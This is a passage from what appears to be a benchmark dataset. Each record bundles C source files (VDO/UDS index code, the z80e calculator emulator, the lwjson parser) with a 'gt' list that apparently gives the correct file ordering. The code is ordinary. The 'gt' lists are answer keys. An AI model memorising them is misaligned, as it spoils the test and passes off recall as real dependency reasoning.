record_count_data[sizeof(u32)];\n\tu32 record_count = 0;\n\tunsigned int record_index;\n\tunsigned int z;\n\n\tresult = uds_write_to_buffered_writer(writer, OPEN_CHAPTER_MAGIC,\n\t\t\t\t\t      OPEN_CHAPTER_MAGIC_LENGTH);\n\tif (result != UDS_SUCCESS)\n\t\treturn result;\n\n\tresult = uds_write_to_buffered_writer(writer, OPEN_CHAPTER_VERSION,\n\t\t\t\t\t      OPEN_CHAPTER_VERSION_LENGTH);\n\tif (result != UDS_SUCCESS)\n\t\treturn result;\n\n\tfor (z = 0; z < index->zone_count; z++) {\n\t\topen_chapter = index->zones[z]->open_chapter;\n\t\trecord_count += open_chapter->size - open_chapter->deletions;\n\t}\n\n\tput_unaligned_le32(record_count, record_count_data);\n\tresult = uds_write_to_buffered_writer(writer, record_count_data,\n\t\t\t\t\t      sizeof(record_count_data));\n\tif (result != UDS_SUCCESS)\n\t\treturn result;\n\n\trecord_index = 1;\n\twhile (record_count > 0) {\n\t\tfor (z = 0; z < index->zone_count; z++) {\n\t\t\topen_chapter = index->zones[z]->open_chapter;\n\t\t\tif (record_index > open_chapter->size)\n\t\t\t\tcontinue;\n\n\t\t\tif (open_chapter->slots[record_index].deleted)\n\t\t\t\tcontinue;\n\n\t\t\trecord = &open_chapter->records[record_index];\n\t\t\tresult = uds_write_to_buffered_writer(writer, (u8 *) record,\n\t\t\t\t\t\t\t      sizeof(*record));\n\t\t\tif (result != UDS_SUCCESS)\n\t\t\t\treturn result;\n\n\t\t\trecord_count--;\n\t\t}\n\n\t\trecord_index++;\n\t}\n\n\treturn uds_flush_buffered_writer(writer);\n}\n\nu64 uds_compute_saved_open_chapter_size(struct index_geometry *geometry)\n{\n\tunsigned int records_per_chapter = geometry->records_per_chapter;\n\n\treturn OPEN_CHAPTER_MAGIC_LENGTH + OPEN_CHAPTER_VERSION_LENGTH + sizeof(u32) +\n\t\trecords_per_chapter * sizeof(struct uds_volume_record);\n}\n\nstatic int load_version20(struct uds_index *index, struct buffered_reader *reader)\n{\n\tint result;\n\tu32 record_count;\n\tu8 record_count_data[sizeof(u32)];\n\tstruct uds_volume_record record;\n\n\n\tbool full_flags[MAX_ZONES] = {\n\t\tfalse,\n\t};\n\n\tresult = uds_read_from_buffered_reader(reader, (u8 *) &record_count_data,\n\t\t\t\t\t       sizeof(record_count_data));\n\tif (result != UDS_SUCCESS)\n\t\treturn result;\n\n\trecord_count = get_unaligned_le32(record_count_data);\n\twhile (record_count-- > 0) {\n\t\tunsigned int zone = 0;\n\n\t\tresult = uds_read_from_buffered_reader(reader, (u8 *) &record,\n\t\t\t\t\t\t       sizeof(record));\n\t\tif (result != UDS_SUCCESS)\n\t\t\treturn result;\n\n\t\tif (index->zone_count > 1)\n\t\t\tzone = uds_get_volume_index_zone(index->volume_index,\n\t\t\t\t\t\t\t &record.name);\n\n\t\tif (!full_flags[zone]) {\n\t\t\tstruct open_chapter_zone *open_chapter;\n\t\t\tunsigned int remaining;\n\n\t\t\topen_chapter = index->zones[zone]->open_chapter;\n\t\t\tremaining = uds_put_open_chapter(open_chapter, &record.name,\n\t\t\t\t\t\t\t &record.data);\n\n\t\t\tfull_flags[zone] = (remaining <= 1);\n\t\t}\n\t}\n\n\treturn UDS_SUCCESS;\n}\n\nint uds_load_open_chapter(struct uds_index *index, struct buffered_reader *reader)\n{\n\tu8 version[OPEN_CHAPTER_VERSION_LENGTH];\n\tint result;\n\n\tresult = uds_verify_buffered_data(reader, OPEN_CHAPTER_MAGIC,\n\t\t\t\t\t  OPEN_CHAPTER_MAGIC_LENGTH);\n\tif (result != UDS_SUCCESS)\n\t\treturn result;\n\n\tresult = uds_read_from_buffered_reader(reader, version, sizeof(version));\n\tif (result != UDS_SUCCESS)\n\t\treturn result;\n\n\tif (memcmp(OPEN_CHAPTER_VERSION, version, sizeof(version)) != 0) {\n\t\treturn vdo_log_error_strerror(UDS_CORRUPT_DATA,\n\t\t\t\t\t      \"Invalid open chapter version: %.*s\",\n\t\t\t\t\t      (int) sizeof(version), version);\n\t}\n\n\treturn load_version20(index, reader);\n}\n",
        "gt": [
            "'vdo/utils/uds/linux/limits.h'",
            "'vdo/utils/uds/volume.h'",
            "'vdo/utils/uds/open-chapter.h'",
            "'vdo/utils/uds/open-chapter.c'"
        ]
    },
    {
        "files": [
            "'z80e/libz80e/include/z80e/ti/asic.h'",
            "'z80e/libz80e/include/z80e/debugger/hooks.h'",
            "'z80e/libz80e/src/ti/asic.c'",
            "'z80e/libz80e/include/z80e/ti/hardware/link.h'"
        ],
        "content": "'z80e/libz80e/include/z80e/ti/asic.h'\n:#ifndef ASIC_H\n#define ASIC_H\n\n#include <stdint.h>\n#ifndef NOLINK\n#include <poll.h>\n#endif\n\ntypedef struct asic asic_t;\n\n#include <z80e/core/cpu.h>\n#include <z80e/log/log.h>\n#include <z80e/ti/memory.h>\n#include <z80e/ti/ti.h>\n#include <z80e/runloop/runloop.h>\n#include <z80e/debugger/hooks.h>\n#include <z80e/debugger/debugger.h>\n#include <z80e/ti/hardware/interrupts.h>\n\ntypedef enum {\n\tBATTERIES_REMOVED,\n\tBATTERIES_LOW,\n\tBATTERIES_GOOD\n} battery_state;\n\n\ntypedef void (*timer_tick)(asic_t *, void *);\ntypedef struct z80_hardware_timers z80_hardware_timers_t;\ntypedef struct z80_hardware_timer z80_hardware_timer_t;\ntypedef struct z80_link_socket z80_link_socket_t;\n\nenum {\n\tTIMER_IN_USE = (1 << 0),\n\tTIMER_ONE_SHOT = (1 << 1)\n};\n\nstruct z80_hardware_timer {\n\tint cycles_until_tick;\n\n\tint flags;\n\tdouble frequency;\n\ttimer_tick on_tick;\n\tvoid *data;\n};\n\nstruct z80_hardware_timers {\n\tint max_timers;\n\tz80_hardware_timer_t *timers;\n};\n\nstruct z80_link_socket {\n#ifndef NOLINK\n\tint accept;\n\tstruct pollfd listenfd;\n\tstruct pollfd clients[10];\n#endif\n};\n\nstruct asic {\n\tint stopped;\n\tti_device_type device;\n\tbattery_state battery;\n\tint battery_remove_check;\n\tint clock_rate;\n\n\tz80cpu_t* cpu;\n\trunloop_state_t *runloop;\n\tti_mmu_t* mmu;\n\tti_interrupts_t *interrupts;\n\tz80_hardware_timers_t *timers;\n\tz80_link_socket_t *link;\n\thook_info_t *hook;\n\tlog_t *log;\n\tdebugger_t *debugger;\n};\n\nasic_t* asic_init(ti_device_type, log_t *);\nvoid asic_free(asic_t*);\n\nint asic_set_clock_rate(asic_t *, int);\n\nint asic_add_timer(asic_t *, int, double, timer_tick, void *);\nvoid asic_remove_timer(asic_t *, int);\n\n#endif\n\n'z80e/libz80e/include/z80e/debugger/hooks.h'\n:#ifndef DEBUGGER_HOOKS_H\n#define DEBUGGER_HOOKS_H\n\n#include <stdint.h>\n\ntypedef struct hook_info hook_info_t;\n\n#include <z80e/ti/asic.h>\n#include <z80e/core/registers.h>\n#include <z80e/ti/hardware/t6a04.h>\n\nhook_info_t *create_hook_set(asic_t *asic);\n\n\n\nuint8_t hook_on_memory_read(hook_info_t *, uint16_t address, uint8_t value);\nuint8_t hook_on_memory_write(hook_info_t *, uint16_t address, uint8_t value);\n\ntypedef uint8_t (*hook_memory_callback)(void *data, uint16_t address, uint8_t value);\n\nvoid hook_remove_memory_read(hook_info_t *, int);\nint hook_add_memory_read(hook_info_t *, uint16_t address_start, uint16_t address_end, void *data, hook_memory_callback);\nvoid hook_remove_register_write(hook_info_t *, int);\nint hook_add_memory_write(hook_info_t *, uint16_t address_start, uint16_t address_end, void *data, hook_memory_callback);\n\n\n\nuint16_t hook_on_register_read(hook_info_t *, registers flags, uint16_t value);\nuint16_t hook_on_register_write(hook_info_t *, registers flags, uint16_t value);\n\ntypedef uint16_t (*hook_register_callback)(void *data, registers reg, uint16_t value);\n\nvoid hook_remove_register_read(hook_info_t *, int);\nint hook_add_register_read(hook_info_t *, registers flags, void *data, hook_register_callback);\nvoid hook_remove_register_write(hook_info_t *, int);\nint hook_add_register_write(hook_info_t *, registers flags, void *data, hook_register_callback);\n\n\n\nuint8_t hook_on_port_in(hook_info_t *, uint8_t port, uint8_t value);\nuint8_t hook_on_port_out(hook_info_t *, uint8_t port, uint8_t value);\n\ntypedef uint8_t (*hook_port_callback)(void *data, uint8_t port, uint8_t value);\n\nvoid hook_remove_port_in(hook_info_t *, int);\nint hook_add_port_in(hook_info_t *, uint8_t port_range_start, uint8_t port_range_end, void *data, hook_port_callback);\nvoid hook_remove_port_out(hook_info_t *, int);\nint hook_add_port_out(hook_info_t *, uint8_t port_range_start, uint8_t port_range_end, void *data, hook_port_callback);\n\n\n\nvoid hook_on_before_execution(hook_info_t *, uint16_t address);\nvoid hook_on_after_execution(hook_info_t *, uint16_t address);\n\ntypedef void (*hook_execution_callback)(void *data, uint16_t address);\n\nvoid hook_remove_before_execution(hook_info_t *, int);\nint hook_add_before_execution(hook_info_t *, void *data, hook_execution_callback);\nvoid hook_remove_after_execution(hook_info_t *, int);\nint hook_add_after_execution(hook_info_t *, void *data, hook_execution_callback);\n\n\n\nvoid hook_on_lcd_update(hook_info_t *, ti_bw_lcd_t *);\n\ntypedef void (*hook_lcd_update_callback)(void *data, ti_bw_lcd_t *lcd);\n\nvoid hook_remove_lcd_update(hook_info_t *, int);\nint hook_add_lcd_update(hook_info_t *, void *data, hook_lcd_update_callback);\n\n#endif\n\n'z80e/libz80e/src/ti/asic.c'\n:#include \"ti/asic.h\"\n#include <stdint.h>\n#include <stdlib.h>\n#include <string.h>\n\n#include \"log/log.h\"\n#include \"core/cpu.h\"\n#include \"ti/memory.h\"\n#include \"ti/hardware/t6a04.h\"\n#include \"ti/hardware/speed.h\"\n#include \"ti/hardware/memorymapping.h\"\n#include \"ti/hardware/keyboard.h\"\n#include \"ti/hardware/status.h\"\n#include \"ti/hardware/flash.h\"\n#include \"ti/hardware/link.h\"\n#include \"ti/hardware/timers.h\"\n\ntypedef struct {\n\tasic_t *asic;\n\tuint8_t port;\n} unimplemented_device_t;\n\nuint8_t read_unimplemented_port(void *device) {\n\tunimplemented_device_t *d = device;\n\tlog_message(d->asic->log, L_INFO, \"asic\",\n\t\t\"Warning: attempted to read from unimplemented port 0x%02x from 0x%04X.\", d->port, d->asic->cpu->registers.PC);\n\treturn 0x00;\n}\n\nvoid write_unimplemented_port(void *device, uint8_t value) {\n\tunimplemented_device_t *d = device;\n\tlog_message(d->asic->log, L_INFO, \"asic\",\n\t\t\"Warning: attempted to write 0x%02x to unimplemented port 0x%02x from 0x%04X.\", value, d->port, d->asic->cpu->registers.PC);\n}\n\nvoid plug_devices(asic_t *asic) {\n\n\tint i;\n\tfor (i = 0; i < 0x100; i++) {\n\t\tunimplemented_device_t *d = malloc(sizeof(unimplemented_device_t));\n\t\td->asic = asic;\n\t\td->port = i;\n\t\tz80iodevice_t device = { d, read_unimplemented_port, write_unimplemented_port };\n\t\tasic->cpu->devices[i] = device;\n\t}\n\n\tasic->cpu->devices[0x01] = init_keyboard();\n\tasic->cpu->devices[0x02] = init_status(asic);\n\tasic->cpu->devices[0x03] = init_interrupts(asic, &asic->interrupts);\n\tsetup_lcd_display(asic, asic->hook);\n\n\tif (asic->device != TI73 && asic->device != TI83p) {\n\t\tasic->cpu->devices[0x20] = init_speed(asic);\n\t\tinit_crystal_timers(asic);\n\t}\n\n\tinit_link_ports(asic);\n\tinit_mapping_ports(asic);\n\tinit_flash_ports(asic);\n}\n\nvoid asic_null_write(void *ignored, uint8_t value) {}\n\nvoid asic_mirror_ports(asic_t *asic) {\n\tint i;\n\tswitch (asic->device) {\n\tcase TI83p:\n\t\tfor (i = 0x08; i < 0x10; i++) {\n\t\t\tasic->cpu->devices[i] = asic->cpu->devices[i & 0x07];\n\t\t\tasic->cpu->devices[i].write_out = asic_null_write;\n\t\t}\n\t\tasic->cpu->devices[0x12] = asic->cpu->devices[0x10];\n\t\tasic->cpu->devices[0x13] = asic->cpu->devices[0x11];\n\t\tasic->cpu->devices[0x15] = asic->cpu->devices[0x05];\n\t\tasic->cpu->devices[0x15].write_out = asic_null_write;\n\t\tfor (i = 0x17; i < 0x100; i++) {\n\t\t\tasic->cpu->devices[i] = asic->cpu->devices[i & 0x07];\n\t\t\tasic->cpu->devices[i].write_out = asic_null_write;\n\t\t}\n\t\tbreak;\n\tdefault:\n\t\tfor (i = 0x60; i < 0x80; i++) {\n\t\t\tasic->cpu->devices[i] = asic->cpu->devices[i - 0x20];\n\t\t}\n\t\tbreak;\n\t}\n}\n\nvoid free_devices(asic_t *asic) {\n\n\tfree_keyboard(asic->cpu->devices[0x01].device);\n\tfree_status(asic->cpu->devices[0x02]);\n\tfree_mapping_ports(asic);\n}\n\nasic_t *asic_init(ti_device_type type, log_t *log) {\n\tasic_t* device = calloc(1, sizeof(asic_t));\n\tdevice->log = log;\n\tdevice->cpu = cpu_init(log);\n\tdevice->mmu = ti_mmu_init(type, log);\n\tdevice->cpu->memory = (void*)device->mmu;\n\tdevice->cpu->read_byte = ti_read_byte;\n\tdevice->cpu->write_byte = ti_write_byte;\n\tdevice->battery = BATTERIES_GOOD;\n\tdevice->device = type;\n\tdevice->clock_rate = 6000000;\n\n\tdevice->timers = calloc(1, sizeof(z80_hardware_timers_t));\n\tdevice->timers->max_timers = 20;\n\tdevice->timers->timers = calloc(20, sizeof(z80_hardware_timer_t));\n\n\tdevice->stopped = 0;\n\tdevice->debugger = 0;\n\tdevice->runloop = runloop_init(device);\n\tdevice->hook = create_hook_set(device);\n\n\tdevice->link = calloc(1, sizeof(z80_link_socket_t));\n\n\tplug_devices(device);\n\tasic_mirror_ports(device);\n\treturn device;\n}\n\nvoid asic_free(asic_t* device) {\n\tti_mmu_free(device->mmu);\n\tfree_devices(device);\n\tcpu_free(device->cpu);\n\tfree(device);\n}\n\nint asic_add_timer(asic_t *asic, int flags, double frequency, timer_tick tick, void *data) {\n\tz80_hardware_timer_t *timer = 0;\n\tint i;\n\tfor (i = 0; i < asic->timers->max_timers; i++) {\n\t\tif (!(asic->timers->timers[i].flags & TIMER_IN_USE)) {\n\t\t\ttimer = &asic->timers->timers[i];\n\t\t\tbreak;\n\t\t}\n\n\t\tif (i == asic->timers->max_timers - 1) {\n\t\t\tasic->timers->max_timers += 10;\n\t\t\tasic->timers->timers = realloc(asic->timers->timers, sizeof(z80_hardware_timer_t) * asic->timers->max_timers);\n\t\t\tz80_hardware_timer_t *ne = &asic->timers->timers[asic->timers->max_timers - 10];\n\t\t\tmemset(ne, 0, sizeof(z80_hardware_timer_t) * 10);\n\t\t}\n\t}\n\n\ttimer->cycles_until_tick = asic->clock_rate / frequency;\n\ttimer->flags = flags | TIMER_IN_USE;\n\ttimer->frequency = frequency;\n\ttimer->on_tick = tick;\n\ttimer->data = data;\n\treturn i;\n}\n\nvoid asic_remove_timer(asic_t *asic, int index) {\n\tasic->timers->timers[index].flags &= ~TIMER_IN_USE;\n}\n\nint asic_set_clock_rate(asic_t *asic, int new_rate) {\n\tint old_rate = asic->clock_rate;\n\n\tint i;\n\tfor (i = 0; i < asic->timers->max_timers; i++) {\n\t\tz80_hardware_timer_t *timer = &asic->timers->timers[i];\n\t\tif (timer->flags & TIMER_IN_USE) {\n\t\t\ttimer->cycles_until_tick =\n\t\t\t\tnew_rate / (timer->cycles_until_tick * timer->frequency);\n\t\t}\n\t}\n\n\tasic->clock_rate = new_rate;\n\treturn old_rate;\n}\n\n'z80e/libz80e/include/z80e/ti/hardware/link.h'\n:#ifndef LINK_H\n#define LINK_H\n\n#include <z80e/ti/asic.h>\n#include <stdbool.h>\n\ntypedef struct {\n\tasic_t *asic;\n\tstruct {\n\t\tuint8_t tip\t\t: 1;\n\t\tuint8_t ring\t: 1;\n\t} them;\n\tstruct {\n\t\tuint8_t tip\t\t: 1;\n\t\tuint8_t ring\t: 1;\n\t} us;\n\tunion {\n\t\tuint8_t mask;\n\t\tstruct {\n\t\t\tuint8_t rx\t\t\t: 1;\n\t\t\tuint8_t tx\t\t\t: 1;\n\t\t\tuint8_t error\t\t: 1;\n\t\t\tuint8_t \t\t\t: 4;\n\t\t\tuint8_t disabled\t: 1;\n\t\t};\n\t} interrupts;\n\tstruct {\n\t\tuint8_t rx_buffer;\n\t\tuint8_t tx_buffer;\n\t\tunion {\n\t\t\tstruct {\n\t\t\t\tuint8_t int_rx_ready\t: 1;\n\t\t\t\tuint8_t int_tx_ready\t: 1;\n\t\t\t\tuint8_t int_error\t\t: 1;\n\t\t\t\tuint8_t rx_active\t\t: 1;\n\t\t\t\tuint8_t rx_ready\t\t: 1;\n\t\t\t\tuint8_t tx_ready\t\t: 1;\n\t\t\t\tuint8_t error\t\t\t: 1;\n\t\t\t\tuint8_t tx_active\t\t: 1;\n\t\t\t};\n\t\t\tuint8_t u8;\n\t\t} status;\n\t} assist;\n\tbool la_ready;\n} link_state_t;\n\nvoid init_link_ports(asic_t *asic);\nvoid free_link_ports(asic_t *asic);\n\nbool link_recv_byte(asic_t *asic, uint8_t val);\n\nint link_read_tx_buffer(asic_t *asic);\n\nbool link_recv_ready(asic_t *asic);\n\n#endif\n",
        "gt": [
            "'z80e/libz80e/include/z80e/debugger/hooks.h'",
            "'z80e/libz80e/include/z80e/ti/asic.h'",
            "'z80e/libz80e/include/z80e/ti/hardware/link.h'",
            "'z80e/libz80e/src/ti/asic.c'"
        ]
    },
    {
        "files": [
            "'lwjson/lwjson/src/include/lwjson/lwjson.h'",
            "'lwjson/dev/lwjson_opts.h'",
            "'lwjson/lwjson/src/include/lwjson/lwjson_opt.h'",
            "'lwjson/examples/example_stream.c'"
        ],
        "content": "'lwjson/lwjson/src/include/lwjson/lwjson.h'\n:\n\n\n#ifndef LWJSON_HDR_H\n#define LWJSON_HDR_H\n\n#include <stdint.h>\n#include <string.h>\n#include \"lwjson/lwjson_opt.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n#define LWJSON_ARRAYSIZE(x) (sizeof(x) / sizeof((x)[0]))\n\n\ntypedef enum {\n    LWJSON_TYPE_STRING,\n    LWJSON_TYPE_NUM_INT,\n    LWJSON_TYPE_NUM_REAL,\n    LWJSON_TYPE_OBJECT,\n    LWJSON_TYPE_ARRAY,\n    LWJSON_TYPE_TRUE,\n    LWJSON_TYPE_FALSE,\n    LWJSON_TYPE_NULL,\n} lwjson_type_t;\n\n\ntypedef LWJSON_CFG_REAL_TYPE lwjson_real_t;\n\n\ntypedef LWJSON_CFG_INT_TYPE lwjson_int_t;\n\n\ntypedef struct lwjson_token {\n    struct lwjson_token* next;\n    lwjson_type_t type;\n    const char* token_name;\n    size_t token_name_len;\n\n    union {\n        struct {\n            const char* token_value;\n            size_t\n                token_value_len;\n        } str;\n\n        lwjson_real_t num_real;\n        lwjson_int_t num_int;\n        struct lwjson_token* first_child;\n    } u;\n} lwjson_token_t;\n\n\ntypedef enum {\n    lwjsonOK = 0x00,\n    lwjsonERR,\n    lwjsonERRJSON,\n    lwjsonERRMEM,\n    lwjsonERRPAR,\n\n    lwjsonSTREAMWAITFIRSTCHAR,\n    lwjsonSTREAMDONE,\n    lwjsonSTREAMINPROG,\n} lwjsonr_t;\n\n\ntypedef struct {\n    lwjson_token_t* tokens;\n    size_t tokens_len;\n    size_t next_free_token_pos;\n    lwjson_token_t first_token;\n\n    struct {\n        uint8_t parsed : 1;\n    } flags;\n} lwjson_t;\n\nlwjsonr_t lwjson_init(lwjson_t* lwobj, lwjson_token_t* tokens, size_t tokens_len);\nlwjsonr_t lwjson_parse_ex(lwjson_t* lwobj, const void* json_data, size_t len);\nlwjsonr_t lwjson_parse(lwjson_t* lwobj, const char* json_str);\nconst lwjson_token_t* lwjson_find(lwjson_t* lwobj, const char* path);\nconst lwjson_token_t* lwjson_find_ex(lwjson_t* lwobj, const lwjson_token_t* token, const char* path);\nlwjsonr_t lwjson_free(lwjson_t* lwobj);\n\nvoid lwjson_print_token(const lwjson_token_t* token);\nvoid lwjson_print_json(const lwjson_t* lwobj);\n\n\ntypedef enum {\n    LWJSON_STREAM_TYPE_NONE,\n    LWJSON_STREAM_TYPE_OBJECT,\n    LWJSON_STREAM_TYPE_OBJECT_END,\n    LWJSON_STREAM_TYPE_ARRAY,\n    LWJSON_STREAM_TYPE_ARRAY_END,\n    LWJSON_STREAM_TYPE_KEY,\n    LWJSON_STREAM_TYPE_STRING,\n    LWJSON_STREAM_TYPE_TRUE,\n    LWJSON_STREAM_TYPE_FALSE,\n    LWJSON_STREAM_TYPE_NULL,\n    LWJSON_STREAM_TYPE_NUMBER,\n} lwjson_stream_type_t;\n\n\ntypedef struct {\n    lwjson_stream_type_t type;\n\n    union {\n        char name[LWJSON_CFG_STREAM_KEY_MAX_LEN\n                  + 1];\n        uint16_t index;\n    } meta;\n} lwjson_stream_stack_t;\n\ntypedef enum {\n    LWJSON_STREAM_STATE_WAITINGFIRSTCHAR = 0x00,\n    LWJSON_STREAM_STATE_PARSING,\n    LWJSON_STREAM_STATE_PARSING_STRING,\n    LWJSON_STREAM_STATE_PARSING_PRIMITIVE,\n    LWJSON_STREAM_STATE_EXPECTING_COMMA_OR_END,\n    LWJSON_STREAM_STATE_EXPECTING_COLON,\n} lwjson_stream_state_t;\n\n\nstruct lwjson_stream_parser;\n\n\ntypedef void (*lwjson_stream_parser_callback_fn)(struct lwjson_stream_parser* jsp, lwjson_stream_type_t type);\n\n\ntypedef struct lwjson_stream_parser {\n    lwjson_stream_stack_t\n        stack[LWJSON_CFG_STREAM_STACK_SIZE];\n    size_t stack_pos;\n\n    lwjson_stream_state_t parse_state;\n\n    lwjson_stream_parser_callback_fn evt_fn;\n\n    void* user_data;\n\n\n    union {\n        struct {\n            char buff[LWJSON_CFG_STREAM_STRING_MAX_LEN\n                      + 1];\n            size_t buff_pos;\n            size_t buff_total_pos;\n            uint8_t is_last;\n        } str;\n\n        struct {\n            char buff[LWJSON_CFG_STREAM_PRIMITIVE_MAX_LEN + 1];\n            size_t buff_pos;\n        } prim;\n\n\n    } data;\n\n    char prev_c;\n} lwjson_stream_parser_t;\n\nlwjsonr_t lwjson_stream_init(lwjson_stream_parser_t* jsp, lwjson_stream_parser_callback_fn evt_fn);\nlwjsonr_t lwjson_stream_set_user_data(lwjson_stream_parser_t* jsp, void* user_data);\nvoid* lwjson_stream_get_user_data(lwjson_stream_parser_t* jsp);\nlwjsonr_t lwjson_stream_reset(lwjson_stream_parser_t* jsp);\nlwjsonr_t lwjson_stream_parse(lwjson_stream_parser_t* jsp, char c);\n\n\n#define lwjson_get_tokens_used(lwobj) (((lwobj) != NULL) ? ((lwobj)->next_free_token_pos + 1) : 0)\n\n\n#define lwjson_get_first_token(lwobj) (((lwobj) != NULL) ? (&(lwobj)->first_token) : NULL)\n\n\n#define lwjson_get_val_int(token)                                                                                      \\\n    ((lwjson_int_t)(((token) != NULL && (token)->type == LWJSON_TYPE_NUM_INT) ? (token)->u.num_int : 0))\n\n\n#define lwjson_get_val_real(token)                                                                                     \\\n    ((lwjson_real_t)(((token) != NULL && (token)->type == LWJSON_TYPE_NUM_REAL) ? (token)->u.num_real : 0))\n\n\n#define lwjson_get_first_child(token)                                                                                  \\\n    (const void*)(((token) != NULL && ((token)->type == LWJSON_TYPE_OBJECT || (token)->type == LWJSON_TYPE_ARRAY))     \\\n                      ? (token)->u.first_child                                                                         \\\n                      : NULL)\n\n\nstatic inline const char*\nlwjson_get_val_string(const lwjson_token_t* token, size_t* str_len) {\n    if (token != NULL && token->type == LWJSON_TYPE_STRING) {\n        if (str_len != NULL) {\n            *str_len = token->u.str.token_value_len;\n        }\n        return token->u.str.token_value;\n    }\n    return NULL;\n}\n\n\n#define lwjson_get_val_string_length(token)                                                                            \\\n    ((size_t)(((token) != NULL && (token)->type == LWJSON_TYPE_STRING) ? (token)->u.str.token_value_len : 0))\n\n\nstatic inline uint8_t\nlwjson_string_compare(const lwjson_token_t* token, const char* str) {\n    if (token != NULL && token->type == LWJSON_TYPE_STRING) {\n        return strncmp(token->u.str.token_value, str, token->u.str.token_value_len) == 0;\n    }\n    return 0;\n}\n\n\nstatic inline uint8_t\nlwjson_string_compare_n(const lwjson_token_t* token, const char* str, size_t len) {\n    if (token != NULL && token->type == LWJSON_TYPE_STRING && len <= token->u.str.token_value_len) {\n        return strncmp(token->u.str.token_value, str, len) == 0;\n    }\n    return 0;\n}\n\n\n\n\n#define lwjson_stack_seq_1(jsp, start_num, sp0) ((jsp)->stack[(start_num)].type == LWJSON_STREAM_TYPE_##sp0)\n#define lwjson_stack_seq_2(jsp, start_num, sp0, sp1)                                                                   \\\n    (lwjson_stack_seq_1((jsp), (start_num) + 0, sp0) && lwjson_stack_seq_1((jsp), (start_num) + 1, sp1))\n#define lwjson_stack_seq_3(jsp, start_num, sp0, sp1, sp2)                                                              \\\n    (lwjson_stack_seq_1((jsp), (start_num) + 0, sp0) && lwjson_stack_seq_2((jsp), (start_num) + 1, sp1, sp2))\n#define lwjson_stack_seq_4(jsp, start_num, sp0, sp1, sp2, sp3)                                                         \\\n    (lwjson_stack_seq_1((jsp), (start_num) + 0, sp0) && lwjson_stack_seq_3((jsp), (start_num) + 1, sp1, sp2, sp3))\n#define lwjson_stack_seq_5(jsp, start_num, sp0, sp1, sp2, sp3, sp4)                                                    \\\n    (lwjson_stack_seq_1((jsp), (start_num) + 0, sp0) && lwjson_stack_seq_4((jsp), (start_num) + 1, sp1, sp2, sp3, sp4))\n#define lwjson_stack_seq_6(jsp, start_num, sp0, sp1, sp2, sp3, sp4, sp5)                                               \\\n    (lwjson_stack_seq_1((jsp), (start_num) + 0, sp0)                                                                   \\\n     && lwjson_stack_seq_5((jsp), (start_num) + 1, sp1, sp2, sp3, sp4, sp5))\n#define lwjson_stack_seq_7(jsp, start_num, sp0, sp1, sp2, sp3, sp4, sp5, sp6)                                          \\\n    (lwjson_stack_seq_1((jsp), (start_num) + 0, sp0)                                                                   \\\n     && lwjson_stack_seq_6((jsp), (start_num) + 1, sp1, sp2, sp3, sp4, sp5, sp6))\n#define lwjson_stack_seq_8(jsp, start_num, sp0, sp1, sp2, sp3, sp4, sp5, sp6, sp7)                                     \\\n    (lwjson_stack_seq_1((jsp), (start_num) + 0, sp0)                                                                   \\\n     && lwjson_stack_seq_7((jsp), (start_num) + 1, sp1, sp2, sp3, sp4, sp5, sp6, sp7))\n\n\n\n\n\n#ifdef __cplusplus\n}\n#endif\n\n#endif\n\n'lwjson/dev/lwjson_opts.h'\n:\n\n\n#ifndef LWJSON_OPTS_HDR_H\n#define LWJSON_OPTS_HDR_H\n\n\n\n\n#define LWJSON_CFG_JSON5    1\n#define LWJSON_CFG_COMMENTS 1\n\n#endif\n\n'lwjson/lwjson/src/include/lwjson/lwjson_opt.h'\n:\n\n\n#ifndef LWJSON_OPT_HDR_H\n#define LWJSON_OPT_HDR_H\n\n\n\n\n\n#ifndef LWJSON_IGNORE_USER_OPTS\n#include \"lwjson_opts.h\"\n#endif\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n#ifndef LWJSON_CFG_REAL_TYPE\n#define LWJSON_CFG_REAL_TYPE float\n#endif\n\n\n#ifndef LWJSON_CFG_INT_TYPE\n#define LWJSON_CFG_INT_TYPE long long\n#endif\n\n\n#ifndef LWJSON_CFG_COMMENTS\n#define LWJSON_CFG_COMMENTS 0\n#endif\n\n\n#ifndef LWJSON_MEMSET\n#define LWJSON_MEMSET(dst, val, len) memset((dst), (val), (len))\n#endif\n\n\n#ifndef LWJSON_MEMCPY\n#define LWJSON_MEMCPY(dst, src, len) memcpy((dst), (src), (len))\n#endif\n\n\n\n\n#ifndef LWJSON_CFG_STREAM_KEY_MAX_LEN\n#define LWJSON_CFG_STREAM_KEY_MAX_LEN 32\n#endif\n\n\n#ifndef LWJSON_CFG_STREAM_STACK_SIZE\n#define LWJSON_CFG_STREAM_STACK_SIZE 16\n#endif\n\n\n#ifndef LWJSON_CFG_STREAM_STRING_MAX_LEN\n#define LWJSON_CFG_STREAM_STRING_MAX_LEN 256\n#endif\n\n\n#ifndef LWJSON_CFG_STREAM_PRIMITIVE_MAX_LEN\n#define LWJSON_CFG_STREAM_PRIMITIVE_MAX_LEN 32\n#endif\n\n\n\n\n\n#ifdef __cplusplus\n}\n#endif\n\n#endif\n\n'lwjson/examples/example_stream.c'\n:#include <stdio.h>\n#include \"lwjson/lwjson.h\"\n\n\nstatic const char* json_str = \"{\\\"k1\\\":\\\"v1\\\",\\\"k2\\\":[true, false]}\";\n\n\nstatic lwjson_stream_parser_t stream_parser;\n\n\nstatic void\nprv_example_callback_func(lwjson_stream_parser_t* jsp, lwjson_stream_type_t type) {\n\n    if (jsp->stack_pos >= 2\n        && lwjson_stack_seq_2(jsp, 0, OBJECT, KEY) && strcmp(jsp->stack[1].meta.name, \"k1\") == 0) {\n        printf(\"Got key '%s' with value '%s'\\r\\n\", jsp->stack[1].meta.name, jsp->data.str.buff);\n    }\n    (void)type;\n}\n\n\nvoid\nexample_stream_run(void) {\n    lwjsonr_t res;\n    printf(\"\\r\\n\\r\\nParsing stream\\r\\n\");\n    lwjson_stream_init(&stream_parser, prv_example_callback_func);\n\n\n    for (const char* c = json_str; *c != '\\0'; ++c) {\n        res = lwjson_stream_parse(&stream_parser, *c);\n        if (res == lwjsonSTREAMINPROG) {\n        } else if (res == lwjsonSTREAMWAITFIRSTCHAR) {\n            printf(\"Waiting first character\\r\\n\");\n        } else if (res == lwjsonSTREAMDONE) {\n            printf(\"Done\\r\\n\");\n        } else {\n            printf(\"Error\\r\\n\");\n            break;\n        }\n    }\n    printf(\"Parsing completed\\r\\n\");\n}\n",
        "gt": [
            "'lwjson/dev/lwjson_opts.h'",
            "'lwjson/lwjson/src/include/lwjson/lwjson_opt.h'",
